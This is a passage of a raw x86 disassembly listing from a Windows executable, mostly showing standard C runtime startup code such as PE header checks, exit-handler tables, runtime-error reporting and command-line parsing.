  4242e2:	xchg   ebx,eax
  4242e3:	mov    al,0x51
  4242e5:	sbb    al,0x88
  4242e7:	xlat   BYTE PTR ds:[ebx]
  4242e8:	addr16 out 0x7a,al
  4242eb:	int    0xf6
  4242ed:	sub    eax,0xa72401f
  4242f2:	ret    
  4242f3:	pop    esp
  4242f4:	cmp    al,0xdb
  4242f6:	bound  eax,QWORD PTR [esi]
  4242f8:	fstp   QWORD PTR [ebp+0x1d57d4a5]
  4242fe:	fidiv  WORD PTR [edi]
  424300:	inc    esp
  424301:	push   ds
  424302:	loope  0x424330
  424304:	fild   WORD PTR [edx]
  424306:	out    0xc9,eax
  424308:	xor    DWORD PTR [ecx-0x54],edi
  42430b:	and    DWORD PTR [ecx],0xffffffc1
  42430e:	not    DWORD PTR [ecx+0x52]
  424311:	add    al,0xaf
  424313:	xchg   BYTE PTR [edx-0x62b91c08],cl
  424319:	push   esi
  42431a:	cmp    ah,BYTE PTR [esi+0x26aa78a]
  424320:	push   0xa0
  424325:	push   0x0
  424327:	call   DWORD PTR ds:0x429030
  42432d:	push   0x0
  42432f:	push   0x0
  424331:	call   DWORD PTR ds:0x429138
  424337:	xor    eax,eax
  424339:	add    esp,0x10
  42433c:	ret    0x10
  42433f:	nop
  424340:	jmp    DWORD PTR ds:0x429124
  424346:	jmp    DWORD PTR ds:0x429128
  42434c:	jmp    DWORD PTR ds:0x42911c
  424352:	jmp    DWORD PTR ds:0x429118
  424358:	cmp    DWORD PTR ds:0x46707c,0x1
  42435f:	jne    0x424366
  424361:	call   0x4248a4
  424366:	push   DWORD PTR [esp+0x4]
  42436a:	call   0x42472d
  42436f:	push   0xff
  424374:	call   DWORD PTR ds:0x466774
  42437a:	pop    ecx
  42437b:	pop    ecx
  42437c:	ret    
  42437d:	cmp    DWORD PTR ds:0x46707c,0x1
  424384:	jne    0x42438b
  424386:	call   0x4248a4
  42438b:	push   DWORD PTR [esp+0x4]
  42438f:	call   0x42472d
  424394:	push   0xff
  424399:	call   0x424573
  42439e:	pop    ecx
  42439f:	pop    ecx
  4243a0:	ret    
  4243a1:	push   0x60
  4243a3:	push   0x429170
  4243a8:	call   0x425290
  4243ad:	mov    edi,0x94
  4243b2:	mov    eax,edi
  4243b4:	call   0x4252e0
  4243b9:	mov    DWORD PTR [ebp-0x18],esp
  4243bc:	mov    esi,esp
  4243be:	mov    DWORD PTR [esi],edi
  4243c0:	push   esi
  4243c1:	call   DWORD PTR ds:0x42906c
  4243c7:	mov    ecx,DWORD PTR [esi+0x10]
  4243ca:	mov    DWORD PTR ds:0x467084,ecx
  4243d0:	mov    eax,DWORD PTR [esi+0x4]
  4243d3:	mov    ds:0x467090,eax
  4243d8:	mov    edx,DWORD PTR [esi+0x8]
  4243db:	mov    DWORD PTR ds:0x467094,edx
  4243e1:	mov    esi,DWORD PTR [esi+0xc]
  4243e4:	and    esi,0x7fff
  4243ea:	mov    DWORD PTR ds:0x467088,esi
  4243f0:	cmp    ecx,0x2
  4243f3:	je     0x424401
  4243f5:	or     esi,0x8000
  4243fb:	mov    DWORD PTR ds:0x467088,esi
  424401:	shl    eax,0x8
  424404:	add    eax,edx
  424406:	mov    ds:0x46708c,eax
  42440b:	xor    esi,esi
  42440d:	push   esi
  42440e:	mov    edi,DWORD PTR ds:0x429044
  424414:	call   edi
  424416:	cmp    WORD PTR [eax],0x5a4d
  42441b:	jne    0x42443c
  42441d:	mov    ecx,DWORD PTR [eax+0x3c]
  424420:	add    ecx,eax
  424422:	cmp    DWORD PTR [ecx],0x4550
  424428:	jne    0x42443c
  42442a:	movzx  eax,WORD PTR [ecx+0x18]
  42442e:	cmp    eax,0x10b
  424433:	je     0x424454
  424435:	cmp    eax,0x20b
  42443a:	je     0x424441
  42443c:	mov    DWORD PTR [ebp-0x1c],esi
  42443f:	jmp    0x424468
  424441:	cmp    DWORD PTR [ecx+0x84],0xe
  424448:	jbe    0x42443c
  42444a:	xor    eax,eax
  42444c:	cmp    DWORD PTR [ecx+0xf8],esi
  424452:	jmp    0x424462
  424454:	cmp    DWORD PTR [ecx+0x74],0xe
  424458:	jbe    0x42443c
  42445a:	xor    eax,eax
  42445c:	cmp    DWORD PTR [ecx+0xe8],esi
  424462:	setne  al
  424465:	mov    DWORD PTR [ebp-0x1c],eax
  424468:	push   0x1
  42446a:	call   0x42523f
  42446f:	pop    ecx
  424470:	test   eax,eax
  424472:	jne    0x42447c
  424474:	push   0x1c
  424476:	call   0x42437d
  42447b:	pop    ecx
  42447c:	call   0x4251b6
  424481:	test   eax,eax
  424483:	jne    0x42448d
  424485:	push   0x10
  424487:	call   0x42437d
  42448c:	pop    ecx
  42448d:	call   0x42509f
  424492:	mov    DWORD PTR [ebp-0x4],esi
  424495:	call   0x424ea1
  42449a:	test   eax,eax
  42449c:	jge    0x4244a6
  42449e:	push   0x1b
  4244a0:	call   0x424358
  4244a5:	pop    ecx
  4244a6:	call   DWORD PTR ds:0x429068
  4244ac:	mov    ds:0x467834,eax
  4244b1:	call   0x424d7f
  4244b6:	mov    ds:0x467074,eax
  4244bb:	call   0x424cdd
  4244c0:	test   eax,eax
  4244c2:	jge    0x4244cc
  4244c4:	push   0x8
  4244c6:	call   0x424358
  4244cb:	pop    ecx
  4244cc:	call   0x424aaa
  4244d1:	test   eax,eax
  4244d3:	jge    0x4244dd
  4244d5:	push   0x9
  4244d7:	call   0x424358
  4244dc:	pop    ecx
  4244dd:	call   0x4245b5
  4244e2:	mov    DWORD PTR [ebp-0x20],eax
  4244e5:	cmp    eax,esi
  4244e7:	je     0x4244f0
  4244e9:	push   eax
  4244ea:	call   0x424358
  4244ef:	pop    ecx
  4244f0:	mov    DWORD PTR [ebp-0x38],esi
  4244f3:	lea    eax,[ebp-0x64]
  4244f6:	push   eax
  4244f7:	call   DWORD PTR ds:0x429064
  4244fd:	call   0x424a41
  424502:	mov    DWORD PTR [ebp-0x68],eax
  424505:	test   BYTE PTR [ebp-0x38],0x1
  424509:	je     0x424511
  42450b:	movzx  eax,WORD PTR [ebp-0x34]
  42450f:	jmp    0x424514
  424511:	push   0xa
  424513:	pop    eax
  424514:	push   eax
  424515:	push   DWORD PTR [ebp-0x68]
  424518:	push   esi
  424519:	push   esi
  42451a:	call   edi
  42451c:	push   eax
  42451d:	call   0x422e90
  424522:	mov    edi,eax
  424524:	mov    DWORD PTR [ebp-0x6c],edi
  424527:	cmp    DWORD PTR [ebp-0x1c],esi
  42452a:	jne    0x424532
  42452c:	push   edi
  42452d:	call   0x4246ed
  424532:	call   0x42470f
  424537:	jmp    0x424564
  424539:	mov    eax,DWORD PTR [ebp-0x14]
  42453c:	mov    ecx,DWORD PTR [eax]
  42453e:	mov    ecx,DWORD PTR [ecx]
  424540:	mov    DWORD PTR [ebp-0x70],ecx
  424543:	push   eax
  424544:	push   ecx
  424545:	call   0x4248dd
  42454a:	pop    ecx
  42454b:	pop    ecx
  42454c:	ret    
  42454d:	mov    esp,DWORD PTR [ebp-0x18]
  424550:	mov    edi,DWORD PTR [ebp-0x70]
  424553:	cmp    DWORD PTR [ebp-0x1c],0x0
  424557:	jne    0x42455f
  424559:	push   edi
  42455a:	call   0x4246fe
  42455f:	call   0x42471e
  424564:	or     DWORD PTR [ebp-0x4],0xffffffff
  424568:	mov    eax,edi
  42456a:	lea    esp,[ebp-0x7c]
  42456d:	call   0x4252cb
  424572:	ret    
  424573:	push   0x42918c
  424578:	call   DWORD PTR ds:0x429044
  42457e:	test   eax,eax
  424580:	je     0x424598
  424582:	push   0x42917c
  424587:	push   eax
  424588:	call   DWORD PTR ds:0x429048
  42458e:	test   eax,eax
  424590:	je     0x424598
  424592:	push   DWORD PTR [esp+0x4]
  424596:	call   eax
  424598:	push   DWORD PTR [esp+0x4]
  42459c:	call   DWORD PTR ds:0x429070
  4245a2:	int3   
  4245a3:	push   0x8
  4245a5:	call   0x42544f
  4245aa:	pop    ecx
  4245ab:	ret    
  4245ac:	push   0x8
  4245ae:	call   0x4253bb
  4245b3:	pop    ecx
  4245b4:	ret    
  4245b5:	mov    eax,ds:0x467830
  4245ba:	test   eax,eax
  4245bc:	je     0x4245c0
  4245be:	call   eax
  4245c0:	push   esi
  4245c1:	push   edi
  4245c2:	mov    ecx,0x42b00c
  4245c7:	mov    edi,0x42b018
  4245cc:	xor    eax,eax
  4245ce:	cmp    ecx,edi
  4245d0:	mov    esi,ecx
  4245d2:	jae    0x4245eb
  4245d4:	test   eax,eax
  4245d6:	jne    0x424617
  4245d8:	mov    ecx,DWORD PTR [esi]
  4245da:	test   ecx,ecx
  4245dc:	je     0x4245e0
  4245de:	call   ecx
  4245e0:	add    esi,0x4
  4245e3:	cmp    esi,edi
  4245e5:	jb     0x4245d4
  4245e7:	test   eax,eax
  4245e9:	jne    0x424617
  4245eb:	push   0x4250e3
  4245f0:	call   0x425560
  4245f5:	mov    esi,0x42b000
  4245fa:	mov    eax,esi
  4245fc:	mov    edi,0x42b008
  424601:	cmp    eax,edi
  424603:	pop    ecx
  424604:	jae    0x424615
  424606:	mov    eax,DWORD PTR [esi]
  424608:	test   eax,eax
  42460a:	je     0x42460e
  42460c:	call   eax
  42460e:	add    esi,0x4
  424611:	cmp    esi,edi
  424613:	jb     0x424606
  424615:	xor    eax,eax
  424617:	pop    edi
  424618:	pop    esi
  424619:	ret    
  42461a:	push   ebp
  42461b:	mov    ebp,esp
  42461d:	push   esi
  42461e:	push   edi
  42461f:	push   0x8
  424621:	call   0x42544f
  424626:	xor    esi,esi
  424628:	inc    esi
  424629:	cmp    DWORD PTR ds:0x4670c4,esi
  42462f:	pop    ecx
  424630:	jne    0x424642
  424632:	push   DWORD PTR [ebp+0x8]
  424635:	call   DWORD PTR ds:0x429078
  42463b:	push   eax
  42463c:	call   DWORD PTR ds:0x429074
  424642:	cmp    DWORD PTR [ebp+0xc],0x0
  424646:	mov    al,BYTE PTR [ebp+0x10]
  424649:	mov    DWORD PTR ds:0x4670c0,esi
  42464f:	mov    ds:0x4670bc,al
  424654:	jne    0x4246a8
  424656:	mov    ecx,DWORD PTR ds:0x467828
  42465c:	test   ecx,ecx
  42465e:	je     0x424689
  424660:	mov    eax,ds:0x467824
  424665:	sub    eax,0x4
  424668:	cmp    eax,ecx
  42466a:	jmp    0x424682
  42466c:	mov    eax,DWORD PTR [eax]
  42466e:	test   eax,eax
  424670:	je     0x424674
  424672:	call   eax
  424674:	mov    eax,ds:0x467824
  424679:	sub    eax,0x4
  42467c:	cmp    eax,DWORD PTR ds:0x467828
  424682:	mov    ds:0x467824,eax
  424687:	jae    0x42466c
  424689:	mov    eax,0x42b01c
  42468e:	mov    esi,0x42b020
  424693:	cmp    eax,esi
  424695:	mov    edi,eax
  424697:	jae    0x4246a8
  424699:	mov    eax,DWORD PTR [edi]
  42469b:	test   eax,eax
  42469d:	je     0x4246a1
  42469f:	call   eax
  4246a1:	add    edi,0x4
  4246a4:	cmp    edi,esi
  4246a6:	jb     0x424699
  4246a8:	mov    eax,0x42b024
  4246ad:	mov    esi,0x42b028
  4246b2:	cmp    eax,esi
  4246b4:	mov    edi,eax
  4246b6:	jae    0x4246c7
  4246b8:	mov    eax,DWORD PTR [edi]
  4246ba:	test   eax,eax
  4246bc:	je     0x4246c0
  4246be:	call   eax
  4246c0:	add    edi,0x4
  4246c3:	cmp    edi,esi
  4246c5:	jb     0x4246b8
  4246c7:	cmp    DWORD PTR [ebp+0x10],0x0
  4246cb:	pop    edi
  4246cc:	pop    esi
  4246cd:	je     0x4246d8
  4246cf:	push   0x8
  4246d1:	call   0x4253bb
  4246d6:	jmp    0x4246ea
  4246d8:	push   DWORD PTR [ebp+0x8]
  4246db:	mov    DWORD PTR ds:0x4670c4,0x1
  4246e5:	call   0x424573
  4246ea:	pop    ecx
  4246eb:	pop    ebp
  4246ec:	ret    
  4246ed:	push   0x0
  4246ef:	push   0x0
  4246f1:	push   DWORD PTR [esp+0xc]
  4246f5:	call   0x42461a
  4246fa:	add    esp,0xc
  4246fd:	ret    
  4246fe:	push   0x0
  424700:	push   0x1
  424702:	push   DWORD PTR [esp+0xc]
  424706:	call   0x42461a
  42470b:	add    esp,0xc
  42470e:	ret    
  42470f:	push   0x1
  424711:	push   0x0
  424713:	push   0x0
  424715:	call   0x42461a
  42471a:	add    esp,0xc
  42471d:	ret    
  42471e:	push   0x1
  424720:	push   0x1
  424722:	push   0x0
  424724:	call   0x42461a
  424729:	add    esp,0xc
  42472c:	ret    
  42472d:	push   ebp
  42472e:	mov    ebp,esp
  424730:	sub    esp,0x10c
  424736:	mov    eax,ds:0x4669f0
  42473b:	xor    eax,DWORD PTR [ebp+0x4]
  42473e:	mov    ecx,DWORD PTR [ebp+0x8]
  424741:	push   ebx
  424742:	push   esi
  424743:	mov    DWORD PTR [ebp-0x4],eax
  424746:	xor    edx,edx
  424748:	push   edi
  424749:	xor    eax,eax
  42474b:	cmp    ecx,DWORD PTR [eax*8+0x466780]
  424752:	je     0x42475a
  424754:	inc    eax
  424755:	cmp    eax,0x12
  424758:	jb     0x42474b
  42475a:	mov    esi,eax
  42475c:	shl    esi,0x3
  42475f:	cmp    ecx,DWORD PTR [esi+0x466780]
  424765:	jne    0x42488e
  42476b:	mov    eax,ds:0x46707c
  424770:	cmp    eax,0x1
  424773:	je     0x424869
  424779:	cmp    eax,edx
  42477b:	jne    0x42478a
  42477d:	cmp    DWORD PTR ds:0x466778,0x1
  424784:	je     0x424869
  42478a:	cmp    ecx,0xfc
  424790:	je     0x42488e
  424796:	push   0x104
  42479b:	lea    eax,[ebp-0x10c]
  4247a1:	push   eax
  4247a2:	push   edx
  4247a3:	mov    BYTE PTR [ebp-0x8],dl
  4247a6:	call   DWORD PTR ds:0x429084
  4247ac:	test   eax,eax
  4247ae:	jne    0x4247c3
  4247b0:	lea    eax,[ebp-0x10c]
  4247b6:	push   0x4294e4
  4247bb:	push   eax
  4247bc:	call   0x425670
  4247c1:	pop    ecx
  4247c2:	pop    ecx
  4247c3:	lea    eax,[ebp-0x10c]
  4247c9:	push   eax
  4247ca:	lea    edi,[ebp-0x10c]
  4247d0:	call   0x4258a0
  4247d5:	inc    eax
  4247d6:	cmp    eax,0x3c
  4247d9:	pop    ecx
  4247da:	jbe    0x424805
  4247dc:	lea    eax,[ebp-0x10c]
  4247e2:	push   eax
  4247e3:	call   0x4258a0
  4247e8:	mov    edi,eax
  4247ea:	lea    eax,[ebp-0x10c]
  4247f0:	sub    eax,0x3b
  4247f3:	push   0x3
  4247f5:	add    edi,eax
  4247f7:	push   0x4294e0
  4247fc:	push   edi
  4247fd:	call   0x425770
  424802:	add    esp,0x10
  424805:	push   edi
  424806:	call   0x4258a0
  42480b:	push   DWORD PTR [esi+0x466784]
  424811:	mov    ebx,eax
  424813:	call   0x4258a0
  424818:	lea    eax,[ebx+eax*1+0x1c]
  42481c:	pop    ecx
  42481d:	add    eax,0x3
  424820:	pop    ecx
  424821:	and    eax,0xfffffffc
  424824:	call   0x4252e0
  424829:	mov    ebx,esp
  42482b:	push   0x4294c4
  424830:	push   ebx
  424831:	call   0x425670
  424836:	push   edi
  424837:	push   ebx
  424838:	call   0x425680
  42483d:	push   0x4294c0
  424842:	push   ebx
  424843:	call   0x425680
  424848:	push   DWORD PTR [esi+0x466784]
  42484e:	push   ebx
  42484f:	call   0x425680
  424854:	push   0x12010
  424859:	push   0x429498
  42485e:	push   ebx
  42485f:	call   0x425572
  424864:	add    esp,0x2c
  424867:	jmp    0x42488e
  424869:	push   edx
  42486a:	lea    eax,[ebp+0x8]
  42486d:	push   eax
  42486e:	lea    esi,[esi+0x466784]
  424874:	push   DWORD PTR [esi]
  424876:	call   0x4258a0
  42487b:	pop    ecx
  42487c:	push   eax
  42487d:	push   DWORD PTR [esi]
  42487f:	push   0xfffffff4
  424881:	call   DWORD PTR ds:0x429080
  424887:	push   eax
  424888:	call   DWORD PTR ds:0x42907c
  42488e:	lea    esp,[ebp-0x118]
  424894:	mov    ecx,DWORD PTR [ebp-0x4]
  424897:	xor    ecx,DWORD PTR [ebp+0x4]
  42489a:	call   0x42595c
  42489f:	pop    edi
  4248a0:	pop    esi
  4248a1:	pop    ebx
  4248a2:	leave  
  4248a3:	ret    
  4248a4:	mov    eax,ds:0x46707c
  4248a9:	cmp    eax,0x1
  4248ac:	je     0x4248bb
  4248ae:	test   eax,eax
  4248b0:	jne    0x4248dc
  4248b2:	cmp    DWORD PTR ds:0x466778,0x1
  4248b9:	jne    0x4248dc
  4248bb:	push   0xfc
  4248c0:	call   0x42472d
  4248c5:	mov    eax,ds:0x4670c8
  4248ca:	test   eax,eax
  4248cc:	pop    ecx
  4248cd:	je     0x4248d1
  4248cf:	call   eax
  4248d1:	push   0xff
  4248d6:	call   0x42472d
  4248db:	pop    ecx
  4248dc:	ret    
  4248dd:	push   ebp
  4248de:	mov    ebp,esp
  4248e0:	push   ecx
  4248e1:	push   ebx
  4248e2:	push   esi
  4248e3:	push   edi
  4248e4:	call   0x425145
  4248e9:	mov    edi,DWORD PTR [ebp+0x8]
  4248ec:	mov    esi,eax
  4248ee:	mov    edx,DWORD PTR [esi+0x54]
  4248f1:	mov    eax,ds:0x466894
  4248f6:	mov    ecx,edx
  4248f8:	cmp    DWORD PTR [ecx],edi
  4248fa:	je     0x424909
  4248fc:	lea    ebx,[eax+eax*2]
  4248ff:	add    ecx,0xc
  424902:	lea    ebx,[edx+ebx*4]
  424905:	cmp    ecx,ebx
  424907:	jb     0x4248f8
  424909:	lea    eax,[eax+eax*2]
  42490c:	lea    eax,[edx+eax*4]
  42490f:	cmp    ecx,eax
  424911:	jae    0x424917
  424913:	cmp    DWORD PTR [ecx],edi
  424915:	je     0x424919
  424917:	xor    ecx,ecx
  424919:	test   ecx,ecx
  42491b:	je     0x424a33
  424921:	mov    ebx,DWORD PTR [ecx+0x8]
  424924:	test   ebx,ebx
  424926:	mov    DWORD PTR [ebp+0x8],ebx
  424929:	je     0x424a33
  42492f:	cmp    ebx,0x5
  424932:	jne    0x424940
  424934:	and    DWORD PTR [ecx+0x8],0x0
  424938:	xor    eax,eax
  42493a:	inc    eax
  42493b:	jmp    0x424a3c
  424940:	cmp    ebx,0x1
  424943:	je     0x424a2e
  424949:	mov    eax,DWORD PTR [esi+0x58]
  42494c:	mov    DWORD PTR [ebp-0x4],eax
  42494f:	mov    eax,DWORD PTR [ebp+0xc]
  424952:	mov    DWORD PTR [esi+0x58],eax
  424955:	mov    eax,DWORD PTR [ecx+0x4]
  424958:	cmp    eax,0x8
  42495b:	jne    0x424a20
  424961:	mov    edx,DWORD PTR ds:0x466888
  424967:	mov    eax,ds:0x46688c
  42496c:	add    eax,edx
  42496e:	cmp    edx,eax
  424970:	jge    0x424999
  424972:	lea    eax,[edx+edx*2]
  424975:	shl    eax,0x2
  424978:	mov    edi,DWORD PTR [esi+0x54]
  42497b:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424980:	mov    edi,DWORD PTR ds:0x466888
  424986:	mov    ebx,DWORD PTR ds:0x46688c
  42498c:	inc    edx
  42498d:	add    ebx,edi
  42498f:	add    eax,0xc
  424992:	cmp    edx,ebx
  424994:	jl     0x424978
  424996:	mov    ebx,DWORD PTR [ebp+0x8]
  424999:	mov    ecx,DWORD PTR [ecx]
  42499b:	cmp    ecx,0xc000008e
  4249a1:	mov    edi,DWORD PTR [esi+0x5c]
  4249a4:	jne    0x4249af
  4249a6:	mov    DWORD PTR [esi+0x5c],0x83
  4249ad:	jmp    0x424a13
  4249af:	cmp    ecx,0xc0000090
  4249b5:	jne    0x4249c0
  4249b7:	mov    DWORD PTR [esi+0x5c],0x81
  4249be:	jmp    0x424a13
  4249c0:	cmp    ecx,0xc0000091
  4249c6:	jne    0x4249d1
  4249c8:	mov    DWORD PTR [esi+0x5c],0x84
  4249cf:	jmp    0x424a13
  4249d1:	cmp    ecx,0xc0000093
  4249d7:	jne    0x4249e2
  4249d9:	mov    DWORD PTR [esi+0x5c],0x85
  4249e0:	jmp    0x424a13
  4249e2:	cmp    ecx,0xc000008d
  4249e8:	jne    0x4249f3
  4249ea:	mov    DWORD PTR [esi+0x5c],0x82
  4249f1:	jmp    0x424a13
  4249f3:	cmp    ecx,0xc000008f
  4249f9:	jne    0x424a04
  4249fb:	mov    DWORD PTR [esi+0x5c],0x86
  424a02:	jmp    0x424a13
  424a04:	cmp    ecx,0xc0000092
  424a0a:	jne    0x424a13
  424a0c:	mov    DWORD PTR [esi+0x5c],0x8a
  424a13:	push   DWORD PTR [esi+0x5c]
  424a16:	push   0x8
  424a18:	call   ebx
  424a1a:	pop    ecx
  424a1b:	mov    DWORD PTR [esi+0x5c],edi
  424a1e:	jmp    0x424a27
  424a20:	and    DWORD PTR [ecx+0x8],0x0
  424a24:	push   eax
  424a25:	call   ebx
  424a27:	mov    eax,DWORD PTR [ebp-0x4]
  424a2a:	pop    ecx
  424a2b:	mov    DWORD PTR [esi+0x58],eax
  424a2e:	or     eax,0xffffffff
  424a31:	jmp    0x424a3c
  424a33:	push   DWORD PTR [ebp+0xc]
  424a36:	call   DWORD PTR ds:0x429088
  424a3c:	pop    edi
  424a3d:	pop    esi
  424a3e:	pop    ebx
  424a3f:	leave  
  424a40:	ret    
  424a41:	cmp    DWORD PTR ds:0x46782c,0x0
  424a48:	jne    0x424a4f
  424a4a:	call   0x425e7c
  424a4f:	push   esi
  424a50:	mov    esi,DWORD PTR ds:0x467834
  424a56:	test   esi,esi
  424a58:	jne    0x424a61
  424a5a:	mov    esi,0x4294fb
  424a5f:	jmp    0x424aa6
  424a61:	mov    al,BYTE PTR [esi]
  424a63:	cmp    al,0x22
  424a65:	jne    0x424a8f
  424a67:	inc    esi
  424a68:	mov    al,BYTE PTR [esi]
  424a6a:	cmp    al,0x22
  424a6c:	je     0x424a9f
  424a6e:	test   al,al
  424a70:	je     0x424a88
  424a72:	movzx  eax,al
  424a75:	push   eax
  424a76:	call   0x42599b
  424a7b:	test   eax,eax
  424a7d:	pop    ecx
  424a7e:	je     0x424a81
  424a80:	inc    esi
  424a81:	inc    esi
  424a82:	mov    al,BYTE PTR [esi]
  424a84:	cmp    al,0x22
  424a86:	jne    0x424a6e
  424a88:	cmp    BYTE PTR [esi],0x22
  424a8b:	jne    0x424aa0
  424a8d:	jmp    0x424a9f
  424a8f:	cmp    al,0x20
  424a91:	jbe    0x424aa0
  424a93:	inc    esi
  424a94:	cmp    BYTE PTR [esi],0x20
  424a97:	ja     0x424a93
  424a99:	jmp    0x424aa0
  424a9b:	cmp    al,0x20
  424a9d:	ja     0x424aa6
  424a9f:	inc    esi
  424aa0:	mov    al,BYTE PTR [esi]
  424aa2:	test   al,al
  424aa4:	jne    0x424a9b
  424aa6:	mov    eax,esi
  424aa8:	pop    esi
  424aa9:	ret    
  424aaa:	push   ebx
  424aab:	xor    ebx,ebx
  424aad:	cmp    DWORD PTR ds:0x46782c,ebx
  424ab3:	push   esi
  424ab4:	push   edi
  424ab5:	jne    0x424abc
  424ab7:	call   0x425e7c
  424abc:	mov    esi,DWORD PTR ds:0x467074
  424ac2:	xor    edi,edi
  424ac4:	cmp    esi,ebx
  424ac6:	jne    0x424ada
  424ac8:	jmp    0x424afa
  424aca:	cmp    al,0x3d
  424acc:	je     0x424acf
  424ace:	inc    edi
  424acf:	push   esi
  424ad0:	call   0x4258a0
  424ad5:	pop    ecx
  424ad6:	lea    esi,[esi+eax*1+0x1]
  424ada:	mov    al,BYTE PTR [esi]
  424adc:	cmp    al,bl
  424ade:	jne    0x424aca
  424ae0:	lea    eax,[edi*4+0x4]
  424ae7:	push   eax
  424ae8:	call   0x425fb2
  424aed:	mov    edi,eax
  424aef:	cmp    edi,ebx
  424af1:	pop    ecx
  424af2:	mov    DWORD PTR ds:0x4670a4,edi
  424af8:	jne    0x424aff
  424afa:	or     eax,0xffffffff
  424afd:	jmp    0x424b57
  424aff:	mov    esi,DWORD PTR ds:0x467074
  424b05:	push   ebp
  424b06:	jmp    0x424b32
  424b08:	push   esi
  424b09:	call   0x4258a0
  424b0e:	mov    ebp,eax
  424b10:	inc    ebp
  424b11:	cmp    BYTE PTR [esi],0x3d
  424b14:	pop    ecx
  424b15:	je     0x424b30
  424b17:	push   ebp
  424b18:	call   0x425fb2
  424b1d:	cmp    eax,ebx
  424b1f:	pop    ecx
  424b20:	mov    DWORD PTR [edi],eax
  424b22:	je     0x424b5b
  424b24:	push   esi
  424b25:	push   eax
  424b26:	call   0x425670
  424b2b:	pop    ecx
  424b2c:	pop    ecx
  424b2d:	add    edi,0x4
  424b30:	add    esi,ebp
  424b32:	cmp    BYTE PTR [esi],bl
  424b34:	jne    0x424b08
  424b36:	push   DWORD PTR ds:0x467074
  424b3c:	call   0x425e9a
  424b41:	mov    DWORD PTR ds:0x467074,ebx
  424b47:	mov    DWORD PTR [edi],ebx
  424b49:	mov    DWORD PTR ds:0x467820,0x1
  424b53:	xor    eax,eax
  424b55:	pop    ecx
  424b56:	pop    ebp
  424b57:	pop    edi
  424b58:	pop    esi
  424b59:	pop    ebx
  424b5a:	ret    
  424b5b:	push   DWORD PTR ds:0x4670a4
  424b61:	call   0x425e9a
  424b66:	mov    DWORD PTR ds:0x4670a4,ebx
  424b6c:	or     eax,0xffffffff
  424b6f:	jmp    0x424b55
  424b71:	push   ebp
  424b72:	mov    ebp,esp
  424b74:	push   ecx
  424b75:	push   ebx
  424b76:	mov    ebx,DWORD PTR [ebp+0xc]
  424b79:	xor    edx,edx
  424b7b:	cmp    DWORD PTR [ebp+0x8],edx
  424b7e:	push   edi
  424b7f:	mov    DWORD PTR [esi],edx
  424b81:	mov    edi,ecx
  424b83:	mov    DWORD PTR [ebx],0x1
  424b89:	je     0x424b94
  424b8b:	mov    ecx,DWORD PTR [ebp+0x8]
  424b8e:	add    DWORD PTR [ebp+0x8],0x4
  424b92:	mov    DWORD PTR [ecx],edi
  424b94:	cmp    BYTE PTR [eax],0x22
  424b97:	jne    0x424ba7
  424b99:	xor    ecx,ecx
  424b9b:	test   edx,edx
  424b9d:	sete   cl
  424ba0:	inc    eax
  424ba1:	mov    edx,ecx
  424ba3:	mov    cl,0x22
  424ba5:	jmp    0x424bd4
  424ba7:	inc    DWORD PTR [esi]
  424ba9:	test   edi,edi
  424bab:	je     0x424bb2
  424bad:	mov    cl,BYTE PTR [eax]
  424baf:	mov    BYTE PTR [edi],cl
  424bb1:	inc    edi
  424bb2:	mov    cl,BYTE PTR [eax]
  424bb4:	movzx  ebx,cl
  424bb7:	inc    eax
  424bb8:	test   BYTE PTR [ebx+0x4674e1],0x4
  424bbf:	je     0x424bcd
  424bc1:	inc    DWORD PTR [esi]
  424bc3:	test   edi,edi
  424bc5:	je     0x424bcc
  424bc7:	mov    bl,BYTE PTR [eax]
  424bc9:	mov    BYTE PTR [edi],bl
  424bcb:	inc    edi
  424bcc:	inc    eax
  424bcd:	test   cl,cl
  424bcf:	mov    ebx,DWORD PTR [ebp+0xc]
  424bd2:	je     0x424c06
  424bd4:	test   edx,edx
  424bd6:	jne    0x424b94
  424bd8:	cmp    cl,0x20
  424bdb:	je     0x424be2
  424bdd:	cmp    cl,0x9
  424be0:	jne    0x424b94
  424be2:	test   edi,edi
  424be4:	je     0x424bea
  424be6:	and    BYTE PTR [edi-0x1],0x0
  424bea:	and    DWORD PTR [ebp-0x4],0x0
  424bee:	cmp    BYTE PTR [eax],0x0
  424bf1:	je     0x424ccd
  424bf7:	mov    cl,BYTE PTR [eax]
  424bf9:	cmp    cl,0x20
  424bfc:	je     0x424c03
  424bfe:	cmp    cl,0x9
  424c01:	jne    0x424c09
  424c03:	inc    eax
  424c04:	jmp    0x424bf7
  424c06:	dec    eax
  424c07:	jmp    0x424bea
  424c09:	cmp    BYTE PTR [eax],0x0
  424c0c:	je     0x424ccd
  424c12:	cmp    DWORD PTR [ebp+0x8],0x0
  424c16:	je     0x424c21
  424c18:	mov    ecx,DWORD PTR [ebp+0x8]
  424c1b:	add    DWORD PTR [ebp+0x8],0x4
  424c1f:	mov    DWORD PTR [ecx],edi
  424c21:	inc    DWORD PTR [ebx]
  424c23:	xor    ebx,ebx
  424c25:	inc    ebx
  424c26:	xor    edx,edx
  424c28:	jmp    0x424c2c
  424c2a:	inc    eax
  424c2b:	inc    edx
  424c2c:	cmp    BYTE PTR [eax],0x5c
  424c2f:	je     0x424c2a
  424c31:	cmp    BYTE PTR [eax],0x22
  424c34:	jne    0x424c5c
  424c36:	test   dl,0x1
  424c39:	jne    0x424c5a
  424c3b:	cmp    DWORD PTR [ebp-0x4],0x0
  424c3f:	je     0x424c4d
  424c41:	lea    ecx,[eax+0x1]
  424c44:	cmp    BYTE PTR [ecx],0x22
  424c47:	jne    0x424c4d
  424c49:	mov    eax,ecx
  424c4b:	jmp    0x424c4f
  424c4d:	xor    ebx,ebx
  424c4f:	xor    ecx,ecx
  424c51:	cmp    DWORD PTR [ebp-0x4],ecx
  424c54:	sete   cl
  424c57:	mov    DWORD PTR [ebp-0x4],ecx
  424c5a:	shr    edx,1
  424c5c:	test   edx,edx
  424c5e:	je     0x424c6d
  424c60:	test   edi,edi
  424c62:	je     0x424c68
  424c64:	mov    BYTE PTR [edi],0x5c
  424c67:	inc    edi
  424c68:	inc    DWORD PTR [esi]
  424c6a:	dec    edx
  424c6b:	jne    0x424c60
  424c6d:	mov    cl,BYTE PTR [eax]
  424c6f:	test   cl,cl
  424c71:	je     0x424cbb
  424c73:	cmp    DWORD PTR [ebp-0x4],0x0
  424c77:	jne    0x424c83
  424c79:	cmp    cl,0x20
  424c7c:	je     0x424cbb
  424c7e:	cmp    cl,0x9
  424c81:	je     0x424cbb
  424c83:	test   ebx,ebx
  424c85:	je     0x424cb5
  424c87:	test   edi,edi
  424c89:	je     0x424ca4
